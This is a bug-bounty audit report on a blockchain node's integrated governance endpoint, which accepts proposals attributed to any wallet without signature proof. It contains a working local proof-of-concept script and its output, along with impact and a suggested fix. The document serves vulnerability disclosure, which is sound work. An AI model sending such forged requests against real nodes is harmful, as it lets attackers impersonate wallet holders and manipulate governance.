# Audit: Integrated `/governance/propose` Wallet-Impersonation Bypass (#71)

## Metadata

- Bounty issue: Scottcjn/rustchain-bounties#71
- Related governance bounty: Scottcjn/rustchain-bounties#50
- Auditor: maelrx
- Public RTC wallet: `RTCc068d2850639325b847e09fc6b8c01b0b88d7be8`
- Repository: Scottcjn/Rustchain
- Commit reviewed: `0c428794e85db8ef5a64639e4ccd9b121e40cab1`
- Primary file reviewed: `node/rustchain_v2_integrated_v2.2.1_rip200.py`
- Requested severity: High

## Finding

The integrated node endpoint `POST /governance/propose` accepts a caller-supplied `wallet` string as the proposer identity and only checks whether that wallet has enough balance. It does not require a signature, public key, nonce, admin key, session, or any other proof that the caller controls the wallet.

Any caller who knows a wallet with more than `GOVERNANCE_MIN_PROPOSER_BALANCE_RTC` can create an active governance proposal attributed to that wallet.

This is a patch gap: PR #2216 added Ed25519 authentication to `node/governance.py` for `/api/governance/propose` and `/api/governance/vote`, but the active integrated server still exposes a separate `/governance/propose` implementation without equivalent proposer authentication.

## Locations

- `node/rustchain_v2_integrated_v2.2.1_rip200.py:5014-5077` - unauthenticated integrated proposal creation
- `node/rustchain_v2_integrated_v2.2.1_rip200.py:7148-7174` - `_balance_i64_for_wallet()` checks balance for caller-supplied wallet
- Fixed comparison surface: `node/governance.py` was hardened by PR #2216, but this integrated endpoint was not.

The vulnerable authorization pattern is:

```python
proposer_wallet = str(data.get('wallet', '')).strip()
...
balance_i64 = _balance_i64_for_wallet(c, proposer_wallet)
...
INSERT INTO governance_proposals (proposer_wallet, title, description, ...)
```

There is no call to `address_from_pubkey()`, `verify_rtc_signature()`, `_verify_miner_signature()`, or `admin_required` before the row is inserted.

## Local Reproduction

Run this from the repository root:

```bash
uv run --no-project --with flask --with prometheus-client --with pynacl --with requests python - <<'PY'
import os, tempfile, sqlite3, importlib.util, sys
sys.path.insert(0, 'node')

fd, db_path = tempfile.mkstemp(suffix='.db')
os.close(fd)
os.environ['RC_ADMIN_KEY'] = 'x' * 32
os.environ['RUSTCHAIN_DB_PATH'] = db_path

spec = importlib.util.spec_from_file_location(
    'integrated',
    'node/rustchain_v2_integrated_v2.2.1_rip200.py'
)
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)

with sqlite3.connect(db_path) as conn:
    conn.execute('CREATE TABLE IF NOT EXISTS balances (miner_id TEXT PRIMARY KEY, amount_i64 INTEGER)')
    conn.execute('INSERT INTO balances (miner_id, amount_i64) VALUES (?, ?)', ('victim_rich_wallet', 50_000_000))
    conn.commit()

client = mod.app.test_client()
resp = client.post('/governance/propose', json={
    'wallet': 'victim_rich_wallet',
    'title': 'attacker forged proposal',
    'description': 'created without wallet signature or public key proof',
})

print('status', resp.status_code)
print('ok', resp.get_json().get('ok'))
print('proposal_wallet', resp.get_json().get('proposal', {}).get('wallet'))

with sqlite3.connect(db_path) as conn:
    print('rows', conn.execute(
        'SELECT proposer_wallet,title,status FROM governance_proposals'
    ).fetchall())

os.unlink(db_path)
PY
```

Observed output:

```text
status 201
ok True
proposal_wallet victim_rich_wallet
rows [('victim_rich_wallet', 'attacker forged proposal', 'active')]
```

The request contains no signature, no public key, and no admin key. The integrated node still creates an active proposal attributed to `victim_rich_wallet`.

## Expected Behavior

Creating a governance proposal should require proof of control over the proposer wallet, matching the hardened model already used elsewhere:

- derive the wallet from `public_key`
- verify an Ed25519 signature over proposal fields and nonce
- reject stale or replayed nonces
- only then check proposer balance and insert the proposal

Unauthenticated requests should return `401`.

## Actual Behavior

The endpoint trusts the JSON `wallet` field. Balance is treated as authorization even though the caller does not prove control of the wallet whose balance is used.

## Impact

This lets an attacker:

- impersonate high-balance wallets as governance proposers
- create active proposals under someone else's identity
- spam or manipulate governance agenda-setting while bypassing proposer authentication
- undermine the already-merged governance-auth hardening in PR #2216 by using the integrated `/governance/propose` route instead of `/api/governance/propose`

The voting endpoint in the integrated server does require a signature, so this report is scoped to proposer impersonation and agenda manipulation, not vote theft. The severity is requested as High because governance proposal creation is a state-changing protocol action and the same auth class was previously treated as security-critical for `node/governance.py`.

## Suggested Fix

Apply the same authentication contract used for `/governance/vote` before inserting a proposal:

1. Require `public_key`, `signature`, and `nonce` in `/governance/propose`.
2. Derive the expected wallet via `address_from_pubkey(public_key)`.
3. Reject if derived wallet does not equal the submitted wallet.
4. Sign a canonical payload including `wallet`, `title`, `description`, and `nonce`.
5. Verify via `verify_rtc_signature(public_key, proposal_message, signature)`.
6. Persist proposal nonces per wallet to reject replays.
7. Only after authentication, evaluate proposer balance and create the proposal.

Alternatively, route the integrated endpoint to the already-hardened governance blueprint and retire the unauthenticated duplicate implementation.

## Confidence

High. The local PoC imports the integrated Flask app against a temporary SQLite DB and demonstrates an actual `201` response plus a persisted `governance_proposals` row without wallet-control proof.

Severity confidence: Medium-High. The issue is a real state-changing auth bypass, but scoped to proposal creation because integrated voting still verifies signatures.
